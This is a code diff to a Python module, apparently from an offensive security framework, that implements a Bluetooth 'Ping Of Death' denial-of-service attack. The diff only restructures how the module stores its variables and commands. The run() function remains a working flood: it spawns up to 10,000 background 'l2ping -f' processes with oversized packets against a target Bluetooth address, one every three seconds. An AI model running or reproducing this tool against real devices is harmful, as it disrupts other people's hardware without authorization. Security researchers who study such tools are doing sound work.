@@ -21,36 +21,24 @@ conf = {
 
 # List of variables
 variables = OrderedDict((
-	('interface', 'hci0'),
-	('bdaddr', 'none'),
-	('size', '600'),
+	('interface', ['hci0', 'interface']),
+	('bdaddr', ['none', 'target bluetooth address']),
+	('size', ['600', 'size of packets (default 600)']),
 ))
-
-# Description for variables
-vdesc = [
-	'interface',
-	'target bluetooth address',
-	'size of packets (default 600)',
-]
 
 # Custom commands
-customcommands = (
-	'scan',
-)
-
-# Help for the custom commands (remove if you will not use custom commands)
-mhelp = OrderedDict((
-	('scan', 'scan for devices'),
-))
+customcommands = {
+	'scan': 'scan for devices'
+}
 
 # Simple changelog
 changelog = "Version 1.0:\nrelease"
 
 def run():
-	print(colors.blue + "[*]Bluetooth Ping Of Death Attack Started ..." + colors.end)
+	print(colors.blue + "[*] Bluetooth Ping Of Death Attack Started ..." + colors.end)
 	try:
 		for i in range(1, 10000):
-			xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'], variables['size'], variables['bdaddr'])
+			xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'][0], variables['size'][0], variables['bdaddr'][0])
 			subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 			time.sleep(3)
 	except(OSError):
